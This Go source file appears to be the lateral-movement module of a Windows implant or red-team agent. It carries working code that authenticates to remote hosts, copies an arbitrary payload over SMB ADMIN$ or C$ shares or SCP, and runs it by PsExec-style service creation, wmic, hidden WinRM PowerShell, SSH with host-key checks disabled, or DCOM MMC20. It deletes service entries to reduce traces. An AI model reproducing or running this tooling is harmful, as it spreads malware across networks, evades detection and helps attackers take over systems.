//go:build windows

package agent

import (
	"fmt"
	"net"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

// ── SCM procs ─────────────────────────────────────────────────────────────────

var (
	modAdvapi32lat          = syscall.NewLazyDLL("advapi32.dll")
	procOpenSCManagerW      = modAdvapi32lat.NewProc("OpenSCManagerW")
	procCreateServiceW      = modAdvapi32lat.NewProc("CreateServiceW")
	procStartServiceW       = modAdvapi32lat.NewProc("StartServiceW")
	procDeleteServiceLat    = modAdvapi32lat.NewProc("DeleteService")
	procCloseServiceHandleLat = modAdvapi32lat.NewProc("CloseServiceHandle")
	procControlServiceLat   = modAdvapi32lat.NewProc("ControlService")
)

const (
	scManagerConnect       = 0x0001
	scManagerCreateService = 0x0002
	serviceWin32OwnProcess = 0x00000010
	serviceDemandStart     = 0x00000003
	serviceErrorIgnore     = 0x00000000
	serviceAllAccess       = 0x000F01FF
	serviceControlStop     = 0x00000001
)

type svcStatus struct{ dwServiceType, dwCurrentState, dwControlsAccepted, dwWin32ExitCode, dwServiceSpecificExitCode, dwCheckPoint, dwWaitHint uint32 }

// ── helpers ───────────────────────────────────────────���───────────────────────

// randSvcName returns a short random service name like "svc3f8a1b2c".
func randSvcName() string {
	n := time.Now().UnixNano()
	return fmt.Sprintf("svc%08x", uint32(n^(n>>32)))
}

// splitDomainUser splits "DOMAIN\user" or "user@domain" → (domain, user).
func splitDomainUser(u string) (string, string) {
	if i := strings.IndexByte(u, '\\'); i >= 0 {
		return u[:i], u[i+1:]
	}
	if i := strings.IndexByte(u, '@'); i >= 0 {
		return u[i+1:], u[:i]
	}
	return ".", u
}

// lateralAuth pre-authenticates to \\host\IPC$ with explicit creds so all
// subsequent SMB operations in this process reuse the authenticated session.
// Uses the WNetAddConnection2W procs already loaded in transport_smb_windows.go.
func lateralAuth(host, user, pass string) {
	if user == "" || pass == "" {
		return
	}
	ipcPath := `\\` + host + `\IPC$`
	lpRemote, _ := syscall.UTF16PtrFromString(ipcPath)
	lpUser, _ := syscall.UTF16PtrFromString(user)
	lpPass, _ := syscall.UTF16PtrFromString(pass)
	nr := netResource{dwType: resourceTypeAny, lpRemoteName: uintptr(unsafe.Pointer(lpRemote))}
	lpCancel, _ := syscall.UTF16PtrFromString(ipcPath)
	procWNetCancelConn2.Call(uintptr(unsafe.Pointer(lpCancel)), 0, 1)
	procWNetAddConn2W.Call(
		uintptr(unsafe.Pointer(&nr)),
		uintptr(unsafe.Pointer(lpPass)),
		uintptr(unsafe.Pointer(lpUser)),
		0,
	)
}

// smbStage writes data to \\host\ADMIN$\<name> (C:\Windows\<name>) or
// falls back to \\host\C$\Windows\Temp\<name>. Returns the local path
// the remote process will see when it executes.
func smbStage(host, name string, data []byte) (string, error) {
	unc1 := `\\` + host + `\ADMIN$\` + name
	if err := os.WriteFile(unc1, data, 0644); err == nil {
		return `C:\Windows\` + name, nil
	}
	unc2 := `\\` + host + `\C$\Windows\Temp\` + name
	if err := os.WriteFile(unc2, data, 0644); err == nil {
		return `C:\Windows\Temp\` + name, nil
	}
	return "", fmt.Errorf("stage to %s: ADMIN$ and C$\\Windows\\Temp both failed (check share access)", host)
}

// ── psExec ────────────────────────────────────���───────────────────────────────

// lateralPSExec stages data to the remote host via SMB admin$ and executes it
// by creating a one-shot service via the remote Service Control Manager.
// The SCM entry is deleted immediately after the service starts to reduce
// footprint (the process continues running).
func lateralPSExec(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	lateralAuth(host, user, pass)

	localPath, err := smbStage(host, exeName, data)
	if err != nil {
		return "", fmt.Errorf("psexec: %w", err)
	}

	machineW, _ := windows.UTF16PtrFromString(`\\` + host)
	scm, _, e := procOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(machineW)),
		0,
		scManagerConnect|scManagerCreateService,
	)
	if scm == 0 {
		return "", fmt.Errorf("psexec OpenSCManager %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(scm)

	svcNameW, _ := windows.UTF16PtrFromString(svcName)
	exePathW, _ := windows.UTF16PtrFromString(localPath)

	svc, _, e := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(svcNameW)),
		uintptr(unsafe.Pointer(svcNameW)), // display name = service name
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(exePathW)),
		0, 0, 0, 0, 0,
	)
	if svc == 0 {
		return "", fmt.Errorf("psexec CreateService %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(svc)

	r, _, e := procStartServiceW.Call(svc, 0, 0)
	procDeleteServiceLat.Call(svc) // clean up SCM entry; process keeps running
	if r == 0 {
		return "", fmt.Errorf("psexec StartService %s: %w", host, e)
	}

	return fmt.Sprintf("[+] psexec → %s\n    svc : %s\n    path: %s", host, svcName, localPath), nil
}

// ── wmiExec ───────��─────────────────────��─────────────────────────────────────

// lateralWMI stages data via SMB and spawns it using WMI Win32_Process::Create.
// Credentials are passed directly to wmic /user /password.
func lateralWMI(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	lateralAuth(host, user, pass)

	localPath, err := smbStage(host, exeName, data)
	if err != nil {
		return "", fmt.Errorf("wmi: %w", err)
	}

	var cmd string
	if user != "" && pass != "" {
		dom, usr := splitDomainUser(user)
		cmd = fmt.Sprintf(`wmic /node:"%s" /user:"%s\\%s" /password:"%s" process call create "%s"`,
			host, dom, usr, pass, localPath)
	} else {
		cmd = fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, host, localPath)
	}

	out, err := runShell(cmd)
	if err != nil {
		return out, fmt.Errorf("wmi %s: %s: %w", host, strings.TrimSpace(out), err)
	}
	return fmt.Sprintf("[+] wmi → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ─�� winrmExec (lateral variant) ───────────────────────────────────────────────

// lateralWinRM stages data via SMB and triggers execution via WinRM
// using PowerShell Invoke-Command.
func lateralWinRM(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	lateralAuth(host, user, pass)

	localPath, err := smbStage(host, exeName, data)
	if err != nil {
		return "", fmt.Errorf("winrm: %w", err)
	}

	// reuse winrmDeploy (winrm_windows.go) to launch the staged EXE
	psPayload := fmt.Sprintf("Start-Process '%s' -WindowStyle Hidden", escapePS(localPath))
	out, err := winrmDeploy(host, user, pass, psPayload)
	if err != nil {
		return out, fmt.Errorf("winrm %s: %w", host, err)
	}
	return fmt.Sprintf("[+] winrm → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ── SSH lateral ───────────────────────────────────────────────────────────────

// lateralSSH stages the payload via SCP and executes it over SSH.
// Uses golang.org/x/crypto/ssh for pure-Go SSH without external binaries.
func lateralSSH(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	// ── connect ───────────────────────────────────────────────────────────────
	addr := host
	if !strings.Contains(host, ":") {
		addr = host + ":22"
	}
	cfg := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil // accept any host key (red team context)
		},
		Timeout: 10 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, cfg)
	if err != nil {
		return "", fmt.Errorf("ssh lateral dial %s: %w", addr, err)
	}
	defer client.Close()

	// ── stage via SCP (inline, no scp binary required) ───────────────────────
	remotePath := `/tmp/` + exeName
	if err := scpUpload(client, data, remotePath); err != nil {
		return "", fmt.Errorf("ssh lateral scp: %w", err)
	}

	// ── execute ───────────────────────────────────────────────────────────────
	sess, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("ssh lateral session: %w", err)
	}
	defer sess.Close()

	cmd := fmt.Sprintf("chmod +x %s && nohup %s </dev/null >/dev/null 2>&1 &", remotePath, remotePath)
	out, _ := sess.CombinedOutput(cmd)
	return fmt.Sprintf("[+] ssh → %s\n    path: %s\n%s", host, remotePath, strings.TrimSpace(string(out))), nil
}

// scpUpload sends data to remotePath on the SSH server using the SCP protocol.
func scpUpload(client *ssh.Client, data []byte, remotePath string) error {
	sess, err := client.NewSession()
	if err != nil {
		return err
	}
	defer sess.Close()

	w, err := sess.StdinPipe()
	if err != nil {
		return err
	}

	dir := remotePath[:strings.LastIndex(remotePath, "/")+1]
	base := remotePath[strings.LastIndex(remotePath, "/")+1:]

	errCh := make(chan error, 1)
	go func() {
		defer w.Close()
		_, e := fmt.Fprintf(w, "C0755 %d %s\n", len(data), base)
		if e != nil {
			errCh <- e
			return
		}
		_, e = w.Write(data)
		if e != nil {
			errCh <- e
			return
		}
		w.Write([]byte{0})
		errCh <- nil
	}()

	if err := sess.Run(fmt.Sprintf("scp -qt %s", dir)); err != nil {
		<-errCh
		return err
	}
	return <-errCh
}

// ── DCOM lateral ──────────────────────────────────────────────────────────────

// lateralDCOM stages data via SMB and executes it using DCOM MMC20.Application.
// This uses PowerShell's [activator]::CreateInstance to call ExecuteShellCommand
// on the remote MMC20.Application COM object — no direct WMI, no SCM.
func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	lateralAuth(host, user, pass)

	localPath, err := smbStage(host, exeName, data)
	if err != nil {
		return "", fmt.Errorf("dcom: %w", err)
	}

	// MMC20.Application via PowerShell — works without local admin on target
	// (only requires DCOM access, which Domain Admins have by default)
	safePath := strings.ReplaceAll(localPath, `'`, `''`)
	psCmd := fmt.Sprintf(
		`$c=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s"));`+
			`$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c start /B '%s'","7")`,
		host, safePath,
	)
	cmd := fmt.Sprintf(`powershell -NoP -W Hidden -Exec Bypass -C "%s"`,
		strings.ReplaceAll(psCmd, `"`, `\"`))

	out, err := runShell(cmd)
	if err != nil {
		return out, fmt.Errorf("dcom %s: %s: %w", host, strings.TrimSpace(out), err)
	}
	return fmt.Sprintf("[+] dcom → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ── dispatcher ────────────────────────────────────────────────────────────────

// runLateral dispatches to the chosen lateral movement method.
func runLateral(method, host string, data []byte, svcName, user, pass string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(method)) {
	case "psexec":
		return lateralPSExec(host, data, svcName, user, pass)
	case "wmi":
		return lateralWMI(host, data, svcName, user, pass)
	case "winrm":
		return lateralWinRM(host, data, svcName, user, pass)
	case "ssh":
		return lateralSSH(host, data, svcName, user, pass)
	case "dcom":
		return lateralDCOM(host, data, svcName, user, pass)
	default:
		return "", fmt.Errorf("unknown method %q — use psexec, wmi, winrm, ssh, dcom", method)
	}
}
